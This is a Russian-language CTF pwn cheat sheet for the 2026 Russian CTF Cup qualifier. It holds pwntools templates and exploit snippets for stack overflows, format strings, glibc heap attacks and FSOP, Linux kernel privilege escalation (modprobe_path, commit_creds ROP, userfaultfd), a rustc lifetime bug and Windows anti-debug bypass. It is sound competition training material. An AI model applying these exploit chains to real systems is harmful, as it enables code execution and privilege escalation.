# PWN — рабочая шпаргалка

Кубок CTF России, отбор 2026. Linux userspace → kernel → нестандартные рантаймы. Всё, что нужно, чтобы за первые 20 минут понять тип задачи и не потерять часы на известных граблях.

## Когда открывать

- Дали ELF/PE, сетевой порт `nc`, меню «create/read/delete/edit», загрузку файла или HTTP-обёртку над бинарём.
- В описании есть `nc <ip> <port>`, `socat`, «сервис», «заметки», «игра», «парсер».
- `checksec` показывает NX/PIE/Canary/RELRO — значит, ожидается память, а не логика.
- Есть `seccomp`, `prctl`, `landlock` — проверяй ORW-шеллкод, а не `system("/bin/sh")`.
- Дают `bzImage`, `vmlinux`, `initramfs.cpio.gz`, `run.sh`, модуль `.ko` — это kernel pwn.
- Дают Rust-исходник, `Cargo.toml`, `proc_macro` и «безопасный» рантайм — смотри `unsafe`, lifetimes, `Vec`.
- Дают Windows `.exe` с TLS-секцией, PEB, антидебагом — это pwn/reverse на Windows, см. §6.
- Есть гонка «проверили размер → открыли/замапили» — TOCTOU, см. §7.
- Сервис перезапускается на каждый коннект (fork-server) — можно брутить canary/адрес побайтно.
- В бинаре нет очевидной уязвимости, но есть `mmap`, `read`, `write`, `ioctl` и странные индексы — ищи OOB и целочисленные ошибки.

## Карта раздела

| § | Тема | Когда нужен |
|---|---|---|
| 0 | Триаж и окружение | Первые 5 минут, checksec, libc, seccomp |
| 1 | pwntools-скелет | Любой эксплойт |
| 2 | Стек | ret2win, canary, ret2libc, SROP |
| 3 | Форматные строки | `printf(user)`, `%p`, `%n` |
| 4 | Куча | tcache, UAF, double free, unsorted, FSOP |
| 5 | Ядро | `bzImage`, QEMU, `modprobe_path`, KASLR |
| 6 | Rust/Windows | cve-rs, TLS callbacks, PEB, антидебаг |
| 7 | TOCTOU и гонки | upload/parse, mmap OOB |
| 8 | Чек-лист 20 минут | Вход в незнакомый бинарь |
| 9 | Разбор 2022–2025 | Задача → техника → вывод |
| 10 | Типовые ошибки | Перед отправкой флага |

## §0. Триаж и окружение

**Признак.** Дали файл, ещё непонятно, что ломать. **Что делать.** Сначала артефакты и защиты, потом запуск.

```bash
file ./chall
checksec --file=./chall
readelf -hW ./chall
readelf -lW ./chall | grep -E 'GNU_STACK|GNU_RELRO|LOAD'
readelf -dW ./chall | grep -E 'BIND_NOW|FLAGS'
readelf -sW ./chall | grep -E ' win|flag|system|execve'
strings -a -n 5 ./chall | head -100
ldd ./chall
```
`checksec` читается так:

| Поле | Значение | Следствие |
|---|---|---|
| `Arch` | `amd64-64-little` / `i386-32-little` | разрядность, соглашение вызовов |
| `RELRO` | `Partial` / `Full` | GOT можно/нельзя перезаписать |
| `Stack` | `Canary found` | нужен leak или брут |
| `NX` | `NX enabled` | шеллкод только в `rwx`/`mprotect` |
| `PIE` | `PIE enabled` | база неизвестна, нужен leak |
| `SHSTK/IBT` | `enabled` | CET, ROP может не сработать |
| `RPATH/RUNPATH` | путь | ищи подсунутый libc |

```bash
# чем собрано и какая libc
strings -a ./chall | grep -E 'GCC:|clang version|GNU C Library'
./libc.so.6 | head -1
# сигнатуры libc в базе
./libc-database/find printf 0x560 0x... 
# seccomp
seccomp-tools dump ./chall
seccomp-tools disasm ./chall
# syscalls, которые реально зовут
strace -f -e trace=execve,openat,read,write,mmap ./chall
```
**Грабли.** `ldd` показывает системную libc, а не ту, что на сервере. Всегда тащи `libc.so.6` и `ld-linux` из раздачи; для локального запуска используй `patchelf`/`pwninit`, а не только `LD_PRELOAD`.

```bash
patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./chall
patchelf --set-rpath . ./chall
# или
pwninit --bin ./chall --libc ./libc.so.6 --ld ./ld-linux-x86-64.so.2
```
`LD_PRELOAD` подменяет libc, но не загрузчик; несовпадение ld даёт `version 'GLIBC_2.38' not found`. Проверяй `./chall` после `patchelf`.

## §1. pwntools-скелет

**Признак.** Любая интерактивная задача. **Что делать.** Один шаблон на все задачи, чтобы не переписывать I/O.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "debug"
HOST, PORT = "10.0.0.1", 1337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript="""
            set pagination off
            set disassembly-flavor intel
            b *main+0x0
            continue
        """, env={"LD_PRELOAD": "./libc.so.6"})
    return process([exe.path], env={"LD_PRELOAD": "./libc.so.6"})

io = start()

def sla(x, y): io.sendlineafter(x, y)
def sl(x):     io.sendline(x)
def ru(x):     return io.recvuntil(x)
def rl():      return io.recvline()
def leak64(x): return u64(x.ljust(8, b"\x00"))

# ....
io.interactive()
```
**Грабли.** `sendlineafter` ест приглашение целиком; если сервис печатает `> ` без перевода строки — `sendafter`. После `recvuntil` в буфере может остаться `\n`; это ломает следующий `recvline`. Для больших бинарей ставь `context.log_level = "info"`, иначе debug-вывод съедает время.

### Гаджеты и one_gadget

```bash
ROPgadget --binary ./chall --only "pop|ret" | grep -E "pop rdi|pop rsi|pop rdx|pop rax"
ROPgadget --binary ./chall --string "/bin/sh"
ROPgadget --binary ./libc.so.6 --only "syscall|ret"
ropper --file ./chall --search "pop rdi; ret"
ropper --file ./chall --search "mov [rdi], rsi"
one_gadget ./libc.so.6
one_gadget --raw ./libc.so.6
```
`one_gadget` даёт адреса `execve("/bin/sh", rsp+..., environ)` при выполнении constraints. На практике часто нужен `[rsp+0x...] == NULL`; проверяй в gdb, а не слепо вставляй.

### GDB: GEF/pwndbg

```bash
gdb -q ./chall \
  -ex 'set pagination off' \
  -ex 'set disassembly-flavor intel' \
  -ex 'b *main' -ex 'run'
```
```text
# GEF
checksec
vmmap
telescope $rsp 20
heap
bins
vis
got
x/20gx $rsp
# pwndbg
heap
bins
vis_heap_chunks
cyclic 200
cyclic -l 0x6161616c
rop --grep "pop rdi"
```
Для точной libc: `gdb -q ./chall -ex 'set environment LD_PRELOAD=./libc.so.6' -ex 'b *main' -ex run`.
**Грабли.** В GEF `heap`/`bins` требуют glibc-debug или работают эвристически; в pwndbg `vis_heap_chunks` может падать на повреждённой куче — тогда `x/40gx $heap`. Не доверяй `$rsp` после `call`: в момент `b *main` стек уже сдвинут.

## §2. Стек

### 2.1. Offset и ret2win

**Признак.** `gets`, `read(0, buf, 0x100)` в буфер 0x40, рядом функция `win`/`flag`. **Что делать.** Найти offset до saved RIP, проверить, что `win` не требует аргументов, и собрать payload.

```bash
python3 -c 'from pwn import *; print(cyclic(200))' | ./chall
# в gdb после падения:
cyclic -l $rsp
```
```python
offset = cyclic_find(0x6161616c)  # значение из регистра/стека
payload = flat(b"A" * offset, exe.sym["win"])
```
Если `win` проверяет аргумент (`if (argc == 2)`), нужен `pop rdi; ret`; для x86_64 без `pop rdx` — `ret2csu`, для 32-bit — `pop; pop; ret`.

**Грабли.** Offset считают до начала saved RIP, а не до `rbp`. На x86_64 после `call` стек выровнен на 16; `system` может упасть на `movaps` — вставь лишний `ret` перед вызовом.

### 2.2. Canary

**Признак.** `checksec`: `Canary found`; функция читает больше буфера; есть вывод буфера/`printf`. **Что делать.** Ликнуть canary, не затерев нулевой младший байт, либо брутить побайтно при fork-server.

```python
# утечка через %p / вывод строки
canary = leak64(ru(b"\n")[:-1])          # если 7 байт, дополнить нулём
canary = u64(b"\x00" + leaked[:7])       # классический вариант
payload = flat(b"A" * off, canary, b"B" * 8, ret, pop_rdi, binsh, system)
```
**Грабли.** Младший байт canary всегда `\x00`; если перезаписываешь его, сервис падает на `__stack_chk_fail`. При бруте по одному байту сервис должен делать `fork()` без `execve`, иначе ASLR/canary меняются. Не путай canary с saved RBP.

### 2.3. ret2libc

**Признак.** NX, PIE/ASLR, есть leak libc (`puts(puts@got)`, `%s`, `write`). **Что делать.** Вернуться в `main`, ликнуть, вычислить базу, вторым пейлоадом вызвать `system("/bin/sh")`.

```python
pop_rdi = ROP(exe).find_gadget(["pop rdi", "ret"]).address
ret     = ROP(exe).find_gadget(["ret"]).address

# stage 1
payload = flat(b"A"*off, canary, b"B"*8, pop_rdi, exe.got["puts"], exe.plt["puts"], exe.sym["main"])
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]

# stage 2
payload = flat(b"A"*off, canary, b"B"*8, ret, pop_rdi, next(libc.search(b"/bin/sh")), libc.sym["system"])
io.sendline(payload)
```
**Грабли.** `puts` печатает до `\x00`, адрес libc в 6 байтах — добивай нулями. Если `system` не поднял шелл, проверь alignment и что `libc.sym["system"]` из нужной версии. `libc.address` меняет базу для `libc.search`, но не для `exe`.

### 2.4. ret2dlresolve

**Признак.** No PIE, Partial RELRO, нет libc leak, есть `read` в `.bss` и вызов `plt0`. **Что делать.** Подделать `Elf64_Rela`/`Sym`, вызвать resolver через `plt0`, получить `system`.

```python
dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
rop = ROP(exe)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
payload = flat({off: rop.chain()})
io.send(payload)
io.send(dlresolve.payload)
```
**Грабли.** Нужен writable `.bss` и `read` с известным адресом; при Full RELRO/`BIND_NOW` не сработает. Смещения `reloc_arg` зависят от версии pwntools — проверяй локально.

### 2.5. SROP

**Признак.** Есть `syscall; ret`, маленький ROP, нужен `execve`, нет удобных гаджетов. **Что делать.** Выставить `rax=15`, вызвать `syscall`, подложить `SigreturnFrame`.

```python
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = next(libc.search(b"/bin/sh"))
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
frame.rsp = stack_addr
payload = flat(b"A"*off, syscall_ret, frame)
```
**Грабли.** Нужен именно `syscall; ret` (или `syscall` с контролем следующего адреса). `SigreturnFrame` — 248 байт; проверь, что хватает `read`. В ядре SROP тоже работает, но требует `rax=15` и валидного `cs/ss`.

## §3. Форматные строки

**Признак.** `printf(buf)`, `fprintf(stdout, user)`, `snprintf` с пользовательским форматом; ввод отражается. **Что делать.** Найти позицию контролируемого qword, ликнуть стек/libc/canary, затем писать `%n`.

```python
# определить offset: AAAABBBB -> 0x4242424241414141
io.sendline(b"AAAABBBB." + b" %p"*20)
# в выводе ищи 0x4242424241414141; номер = позиция
```
```python
# лик
payload = b"%7$p"          # 7-й аргумент
payload = b"%9$s" + p64(addr)  # если addr лежит на стеке
# запись
payload = fmtstr_payload(offset, {exe.got["exit"]: exe.sym["win"]}, write_size="byte")
```
`fmtstr_payload` умеет `write_size="byte"|"short"|"int"`; для больших значений используй `byte`, иначе payload огромный.

**Грабли.** На x86_64 первые 6 аргументов в регистрах, `%7$p` — первый стековый. `%n` пишет число уже выведенных байт; при `%hhn` — младший байт. Если `printf` вызывает `%s` по невалидному адресу — сегфолт, используй `%p` для разведки. Full RELRO → пиши в saved RIP/`__malloc_hook` (если есть)/TLS, не в GOT.

## §4. Куча

### 4.1. Базовые структуры

**Признак.** Меню `malloc/free/edit/show`, заметки, UAF, double free. **Что делать.** Понять версию glibc и тип bins; построить leak → write.

```text
chunk: prev_size | size | user data
tcache: 64 bins, LIFO, count в tcache_perthread_struct (первый chunk heap)
fastbin: <0x80, LIFO, fd
unsorted: fd/bk -> main_arena
```
```bash
strings -a libc.so.6 | grep 'GNU C Library'
# 2.31 / 2.35 / 2.39 — от этого зависят хуки и safe-linking
```
### 4.2. Tcache poisoning

**Признак.** UAF/двойное освобождение chunk размера ≤ 0x410; можно править `fd`. **Что делать.** Отравить tcache на target, выделить chunk в нужном месте.

```python
# glibc < 2.32
free(0); free(1); free(0)
edit(0, p64(target))

# glibc >= 2.32: safe-linking
def protected(pos, ptr):
    return ptr ^ (pos >> 12)
edit(0, p64(protected(chunk0_addr, target)))
```
**Грабли.** С 2.32 `fd` ксорится с `pos >> 12`; `pos` — адрес самого поля `fd`, а не user pointer. С 2.29 есть `key`; двойной free в один bin ловится. Target должен быть выровнен на 16 и иметь валидный size при `malloc`.

### 4.3. Unsorted bin leak

**Признак.** Можно освободить chunk > tcache max (0x410) и затем прочитать его. **Что делать.** `free` большого chunk → `fd/bk = main_arena+96`; вычислить libc.

```python
add(0, b"A"*0x420)
free(0)
show(0)
leak = u64(ru(b"\n")[:-1].ljust(8, b"\x00"))
libc.address = leak - (libc.sym["main_arena"] + 96)
```
**Грабли.** В tcache большие chunk не попадают только если bin заполнен или размер > max. `main_arena` может отсутствовать в символах stripped libc — ищи по смещению из `__malloc_hook`/`_IO_2_1_stdout_` или используй debug symbols. Не путай `main_arena+96` с `main_arena+0x60` в разных версиях.

### 4.4. Overlap и off-by-one

**Признак.** `read` на 1 байт больше, `strcpy`, `strcat`, цикл `for(i<=n)`. **Что делать.** Перезаписать `size` следующего chunk, получить overlap, затем leak/write.

```text
A: [prev_size][size=0x21][data 0x20]
B: [prev_size][size=0x21][...]
off-by-one в A перезаписывает младший байт size B -> 0x41/0x61
```
**Грабли.** `prev_inuse` и `prev_size` должны быть согласованы; при `free` сработает `malloc_printerr`. Для glibc 2.29+ проверяется `size` и `next->size`.

### 4.5. FSOP и exit handlers

**Признак.** Есть arbitrary write, но нет простого RIP; glibc с `_IO_2_1_stdout_`; вызов `puts`/`exit`. **Что делать.** Переписать `_IO_2_1_stdout_` + vtable/wide_data либо `__exit_funcs`.

```python
# 2.31: _IO_str_jumps -> _IO_str_overflow
# 2.35+: _IO_wfile_jumps -> _IO_wfile_overflow + fake _wide_data
stdout = libc.sym["_IO_2_1_stdout_"]
write(p64(fake_vtable), stdout + 0xd8)
write(p64(0), stdout + 0x88)      # _lock
write(p64(0), stdout + 0x20)      # _IO_write_base
write(p64(1), stdout + 0x28)      # _IO_write_ptr
```
```python
# exit handler: __exit_funcs->initial[i]
# flavor ef_free (0), func = PTR_MANGLE(target)
# PTR_MANGLE(x) = rol(x ^ fs:0x30, 17)
```
**Грабли.** С 2.34 `__free_hook`/`__malloc_hook` удалены; `_IO_vtable_check` не даёт подставить произвольный vtable вне `__libc_IO_vtables`. С 2.35 нужен `_wide_data` и корректные `_wide_vtable`. Смещения `_IO_FILE` (0xd8 vtable, 0xe0 size) проверяй в своей libc, они меняются.

### 4.6. TLS/printf и указатели с мангингом

**Признак.** Есть arbitrary write в libc/TLS; `__call_tls_dtors`, `printf`, `exit`. **Что делать.** Переписать TLS-деструктор или `printf`-таблицы; учитывать мангинг.

```python
# secret лежит в fs:0x30 (TLS), часто ликается рядом с libc
secret = u64(leak[fs_base + 0x30:fs_base + 0x38])
mangled = rol(target ^ secret, 17, 64)
```
**Грабли.** В `bad_parser` (2025) указатель на TLS-деструктор мангится именно так; без `secret` запись не сработает. `fs_base` не равен `libc_base`; в задаче он был `libc_base - 10432`, но это смещение конкретного бинаря.

## §5. Ядро

**Признак.** `bzImage`, `vmlinux`, `initramfs.cpio.gz`, `run.sh`, модуль `.ko`, `ioctl` в `/dev/...`. **Что делать.** Распаковать, собрать run-скрипт, найти примитив, обойти KASLR/SMEP/SMAP/KPTI.

```bash
file bzImage vmlinux initramfs.cpio.gz
strings -a bzImage | grep -m1 'Linux version'
extract-vmlinux bzImage > vmlinux
nm -n vmlinux | grep -E ' commit_creds| prepare_kernel_cred| modprobe_path| swapgs_restore'
ROPgadget --binary vmlinux --only 'pop|ret' | grep 'pop rdi'
```
```bash
mkdir initramfs && cd initramfs
cpio -idmv < ../initramfs.cpio.gz
# правим init, добавляем свой бинарь/флаг
find . -print0 | cpio --null -o -H newc | gzip -9 > ../initramfs_new.cpio.gz
```
```bash
qemu-system-x86_64 \
  -m 256M -smp 2 \
  -kernel bzImage \
  -initrd initramfs_new.cpio.gz \
  -append 'console=ttyS0 root=/dev/ram rw oops=panic panic=1 kaslr' \
  -nographic -monitor /dev/null \
  -cpu kvm64,+smep,+smap -s
```
Проверки внутри гостя:

```bash
cat /proc/kallsyms | grep -E ' commit_creds| modprobe_path'
cat /proc/modules
cat /sys/module/*/sections/.text
dmesg | tail
cat /proc/sys/kernel/kptr_restrict
cat /proc/sys/vm/unprivileged_userfaultfd
```
### 5.1. KASLR leak

**Признак.** Нужен адрес ядра, но `kptr_restrict=1`; есть OOB read/print. **Что делать.** Ликнуть указатель из heap/stack/`cpu_entry_area`; вычесть известное смещение.

```c
uint64_t leak = *(uint64_t *)(buf + off);
uint64_t base = leak - 0x1008e00;     // смещение конкретной задачи
uint64_t modprobe = base + 0x2fde720;
```
В `play_with_ker` (2025) лик шёл из `cpu_entry_area` по фиксированному адресу `0xfffffe0000000004`; база считалась как `leak - 0x1008e00`. В `babystack` (2022) ликали saved RIP со стека и вычитали `0x2b2255` до `commit_creds`.

**Грабли.** Смещения уникальны для каждого `vmlinux`; не переноси между задачами. `kptr_restrict` не мешает чтению памяти, если у тебя уже есть OOB. `cpu_entry_area` может быть недоступен при KPTI.

### 5.2. modprobe_path

**Признак.** Есть arbitrary write в kernel memory; `CONFIG_STATIC_USERMODEHELPER` выключен. **Что делать.** Записать путь к своему скрипту в `modprobe_path`, вызвать `request_module`.

```bash
nm -n vmlinux | grep modprobe_path
# в эксплойте: write("/tmp/x\0", modprobe_path)
```
```bash
cat > /tmp/x <<'EOF'
#!/bin/sh
cat /flag > /tmp/flag
chmod 777 /tmp/flag
EOF
chmod +x /tmp/x
printf '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
/tmp/dummy
```
В `play_with_ker` триггером был `socket(AF_ALG)` с неизвестным `salg_type`; в общем случае — execve файла с неизвестной сигнатурой.

**Грабли.** `modprobe_path` должен быть в writable kernel data; проверь, что `CONFIG_STATIC_USERMODEHELPER=n`. Если `modprobe_path` перезаписан, но trigger не срабатывает — `request_module` может быть отключён/закэширован. Путь должен быть абсолютным и завершаться `\0`.

### 5.3. userfaultfd

**Признак.** Гонка `copy_from_user`/`copy_to_user`, нужно остановить поток в нужный момент. **Что делать.** Зарегистрировать страницу через `userfaultfd`, повесить обработчик, блокировать `read`/`write`.

```c
int uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API, .features = 0 };
ioctl(uffd, UFFDIO_API, &api);
void *page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = { .range = { .start = (unsigned long)page, .len = 0x1000 },
                               .mode = UFFDIO_REGISTER_MODE_MISSING };
ioctl(uffd, UFFDIO_REGISTER, &reg);
```
**Грабли.** С 5.11 `unprivileged_userfaultfd` часто `0`; нужен `CAP_SYS_PTRACE` или root в initramfs. `UFFDIO_COPY` должен выполняться в отдельном потоке, иначе deadlock.

### 5.4. SMEP/SMAP/KPTI

**Признак.** `commit_creds(prepare_kernel_cred(0))` не работает из userland; после `iretq` падение. **Что делать.** ROP по ядру, затем `swapgs; iretq` или KPTI trampoline.

```c
// сохранить user state
asm("mov %%cs,%0; mov %%ss,%1; mov %%rsp,%2; pushfq; pop %3"
    : "=r"(cs), "=r"(ss), "=r"(sp), "=r"(flags));
```
```text
pop rdi; 0
prepare_kernel_cred
mov rdi, rax
commit_creds
swapgs
iretq
user_rip | user_cs | user_rflags | user_sp | user_ss
```
Для KPTI: `swapgs_restore_regs_and_return_to_usermode + offset`, затем `pop rdi; ...; iretq`. Точный offset ищи в `vmlinux` по `nm`/`objdump`.

**Грабли.** SMEP блокирует исполнение user-страниц, SMAP — доступ к user-данным; не пытайся `ret2usr`. `swapgs` без `iretq` ломает GS. В QEMU `-cpu kvm64,+smep,+smap` включает защиты; для отладки можно убрать, но remote будет с ними.

### 5.5. Heap-примитивы ядра

**Признак.** `msg_msg`, `pipe_buffer`, `sk_buff`, `setxattr`, `io_uring`, `seq_operations`. **Что делать.** Спрей, UAF/OOB, перезапись `pipe_buffer->ops`/`msg_msg->m_ts` (`m_ts` больше реального → OOB read), `seq_operations->start` (RIP при чтении `/proc/self/stat`).
**Грабли.** `CONFIG_SLAB_FREELIST_RANDOM/HARDENED` ломают предсказуемость; `msg_msg` может быть в `kmalloc-cg`; `pipe_buffer->ops` проверяй по версии ядра.

## §6. Rust и Windows

### 6.1. Rust lifetime / cve-rs

**Признак.** Дают `main.rs`, `Cargo.toml`, `proc_macro`, запрещают `unsafe`, разрешают только `prelude`; задача про «memory safety». **Что делать.** Расширить lifetime через баг компилятора, получить два `Vec` на одной памяти, сделать arbitrary read/write.

```rust
#[inline(never)] pub const fn lifetime_translator<'a,'b,T:?Sized>(_: &'a &'b (), v: &'b T) -> &'a T { v }
#[inline(never)] pub fn lifetime_translator_mut<'a,'b,T:?Sized>(_: &'a &'b (), v: &'b mut T) -> &'a mut T { v }
pub const STATIC_UNIT: &&() = &&();
pub fn expand<'a,'b,T:?Sized>(x: &'a T) -> &'b T {
    let f: for<'x> fn(_, &'x T) -> &'b T = lifetime_translator; f(STATIC_UNIT, x)
}
pub fn expand_mut<'a,'b,T:?Sized>(x: &'a mut T) -> &'b mut T {
    let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lifetime_translator_mut; f(STATIC_UNIT, x)
}
```
```rust
let v = {
    let mut a = vec![];
    for _ in 0..8 { a.push([0u8; 3]); }   // capacity 24 == size_of::<Vec<u8>>()
    expand_mut(&mut a)
};
let mut vv = vec![vec![1337u64]];         // вектор на куче
// v и vv перекрываются: читаем/пишем указатель буфера vv
```
**Грабли.** Нужен точный размер `Vec` (24 байта на x86_64) и capacity == size, иначе перезапишешь не те поля. Компилятор может оптимизировать `expand_mut`; используй `#[inline(never)]` и release. В `safelang` проверка макросов запрещает `unsafe`, но cve-rs его и не использует. После получения AW ищи libc-указатель в heap, затем `environ`, затем ROP на стек.

```bash
rustfilt -i < symbols.txt
strings -a ./bin | grep -E 'rustc|/rustc/|cargo'
readelf -S ./bin | grep -i rust
```
### 6.2. Windows: TLS callbacks, PEB, антидебаг

**Признак.** PE с `.tls`, `TlsCallback`, `BeingDebugged`, `NtQueryInformationProcess`, `CheckRemoteDebuggerPresent`; проверка флага «не работает под отладчиком». **Что делать.** Найти TLS callback, поставить брейкпоинт до `main`, снять антидебаг, вытащить seed из PEB.

```python
import pefile
pe = pefile.PE("Wincrack.exe")
tls = pe.DIRECTORY_ENTRY_TLS.struct
base = pe.OPTIONAL_HEADER.ImageBase
cb = tls.AddressOfCallBacks - base
while True:
    fn = pe.get_qword_at_rva(cb)
    if not fn:
        break
    print(hex(fn))
    cb += 8
```
```text
PEB x64: gs:[0x60]
+0x002 BeingDebugged
+0x010 ImageBaseAddress
+0x018 Ldr
+0x0BC NtGlobalFlag (x64; x86 +0x068)
Heap: Flags/ForceFlags
```
```c
// антидебаг, который надо обойти
__readgsqword(0x60) + 2;       // BeingDebugged
__readgsqword(0x60) + 0xBC;    // NtGlobalFlag
CheckRemoteDebuggerPresent(GetCurrentProcess(), &b);
NtQueryInformationProcess(h, 7, &port, ...);   // ProcessDebugPort
NtQueryInformationProcess(h, 0x1e, &handle, ...); // DebugObjectHandle
NtQueryInformationProcess(h, 0x1f, &flags, ...);  // DebugFlags
```
В `Wincrack` (2025) TLS-callback патчил фейковую проверку на реальную `RealFlagChecker`, а seed лежал в `PEB+0x400`/`PEB+0x800`; при отладчике seed занулялся. Патчь TLS-callback или `BeingDebugged`, затем повтори генерацию ключа.

```text
x64dbg: bp <addr>; run; F7/F8; dump <addr>; follow in dump
ScyllaHide / TitanHide: скрыть PEB, NtGlobalFlag, heap flags
hw bp на VirtualProtect -> dump расшифрованного кода
```
**Грабли.** `NtGlobalFlag` зависит от битности; в x64 отладчике `gs:[0x60]`, в x86 — `fs:[0x30]`. TLS-callback выполняется до `main`, поэтому `bp main` его пропускает. Патч в памяти недостаточен, если файл перечитывается/проверяется хеш — патчь код проверки.

## §7. TOCTOU и гонки

**Признак.** Загрузка файла, затем отдельный «парсинг»; между проверкой размера и `mmap`/`read` есть окно; несколько потоков/процессов. **Что делать.** Подменить файл/данные в окне, вызвать OOB, получить leak/write.

```python
# bad_parser (2025): загрузка -> парсинг
# 1) загрузить маленький файл, получить mmap нужного размера
# 2) в момент парсинга подменить содержимое на большое
# 3) OOB read вытаскивает libc, OOB write правит TLS/exit handler
```
**Грабли.** Гонка нестабильна; используй `userfaultfd`, `FUSE`, `renameat2(RENAME_EXCHANGE)` или повторяй until success. Проверяй, что размер в заголовке и реальный размер не сверяются повторно. `mmap` с `MAP_FIXED` может затереть нужные страницы.

## §8. Чек-лист на 20 минут при виде бинаря

1. `file`, `checksec`, `strings`, `readelf -hW/-lW/-dW` — arch, PIE, RELRO, canary, NX, RPATH.
2. Запусти локально: какие меню, сколько ввода, где вывод, есть ли `fork`.
3. `seccomp-tools dump` — можно ли `execve`, или только `open/read/write`.
4. Найди источники ввода: `gets`, `read`, `scanf`, `fgets`, `strcpy`, `memcpy`, индексы, длины.
5. Найди sink: `printf(user)`, `free`, `system`, `execve`, `mmap`, `ioctl`.
6. Определи offset через `cyclic`; проверь canary и saved RIP.
7. Есть ли leak: `puts`, `write`, `%p`, `%s`, OOB read, uninitialized stack.
8. Определи libc: `strings`, `libc-database`, `one_gadget`; проверь `ld`.
9. Построй минимальный примитив: ret2win / ret2libc / fmt / tcache / AW.
10. Проверь ограничения: Full RELRO, CET, seccomp, ASLR, таймаут.
11. Локально воспроизведи с точной libc/loader; только потом remote.
12. После флага проверь формат и отсутствие лишнего `\n`.

## §9. Разбор задач Кубка 2022–2025

| Задача | Год | Техника | Вывод |
|---|---|---|---|
| `babypwn` | 2025 | произвольная запись байта по индексу, overwrite low byte saved RIP на `win` | считать offset до return address, менять только младший байт |
| `bad_parser` | 2025 | TOCTOU + mmap OOB + libc leak + overwrite TLS/printf/exit handler | гонка даёт OOB; TLS-указатель мангится секретом `fs:0x30` |
| `play_with_ker` | 2025 | kernel OOB heap, file spray fake struct, KASLR leak via `cpu_entry_area`, AW `modprobe_path` | fake object в page cache; trigger `socket(AF_ALG)` |
| `safelang` (+revenge) | 2025 | cve-rs lifetime extension, `Vec` overlap → AR/AW, heap scan → libc → `environ` → stack ROP | ограничение `unsafe` не спасает; нужен capacity 24 |
| `more_heap` | 2023 | 2free/tcache poisoning → arbitrary write; fake 0x460 → unsorted leak; `strchrnul@got` → `puts`; FSOP `_IO_obstack_overflow` | FSOP можно превратить в `read` на стек |
| `some_storage` | 2023 | overflow `User.name[]` → `free_list`; task list pointer confusion → heap leak → vtable → shellcode | один нулевой байт и кривой free-list дают цепочку |
| `spy` | 2023 | arbitrary 8-byte write; `puts@got=main`; `_fini_array=spy_open`; `strchrnul@got=spy_print`; `puts@got=printf@plt` | GOT + `_fini_array` — полноценный ROP без переполнения |
| `babystack` | 2022 | kernel stack OOB, leak canary/KASLR, ROP `commit_creds(prepare_kernel_cred(0))`, `swapgs; iretq` | kernel ROP требует сохранить user `cs/ss/rflags/rsp` |
| `ozne` | 2022 | huge `mmap` chunk, libc рядом, leak `malloc`, `strlen@got` → `system`, username `/bin/sh` | `mmap`-чанк может лежать вплотную к libc |
| `shellyha` | 2022 | restricted x86 shellcode, xor-патч в `int 0x80`, stage `read` | фильтр символов обходится самомодифицирующимся кодом |
| `watcher` | 2022 | watcher следит за страницей кода; leak `fs`, side-channel по битам, `mprotect` | целостность кода обходится не записью, а чтением/таймингом |

## §10. Типовые ошибки на контесте

- **Offset.** Считаешь до `rbp`, а не до saved RIP; забываешь canary; путаешь 32/64-bit. Всегда проверяй `cyclic -l` и `x/gx $rsp`.
- **Libc version.** Локально системная, на сервере другая; `LD_PRELOAD` без `ld`; неверный `patchelf`. Тащи `libc.so.6` + `ld-linux` и проверяй `./chall`.
- **ASLR.** Хардкодишь адрес после одного локального запуска; не делаешь leak; PIE low 12 bits. Ликай базу и пересчитывай все символы.
- **Alignment.** `system` падает на `movaps`; добавь `ret` перед вызовом. В kernel — `swapgs`/`iretq` порядок.
- **seccomp.** `system("/bin/sh")` не работает; нужен ORW: `open/read/write`, иногда `openat`, `sendfile`. Проверь архитектуру syscall (x86 vs x86_64).
- **Network.** `recvuntil` не того промпта; `sendline` добавляет `\n`; сервис буферизует вывод; таймаут 1–2 с. После `recvuntil` очищай остаток.
- **Timeout.** Тяжёлый брутфорс на remote; оптимизируй, брути параллельно, используй fork-server. Не делай `sleep` без нужды.
- **Heap.** Забыл safe-linking (2.32+), `key` (2.29+), `__free_hook` удалён (2.34+); неверный size chunk; target не выровнен.
- **FSOP.** Смещения `_IO_FILE`/vtable зависят от glibc; `_IO_vtable_check`; нужен `_wide_data` на 2.35+.
- **Kernel.** Смещения `modprobe_path`/`commit_creds` уникальны; KASLR base считаешь от не того leak; SMEP/SMAP не обошёл; `CONFIG_STATIC_USERMODEHELPER=y`.
- **Флаг.** `ctfcup{}` vs `CTFCup{}`, лишний `\n`, обрезанный `}`; динамический флаг — читай файл, а не строку из writeup.
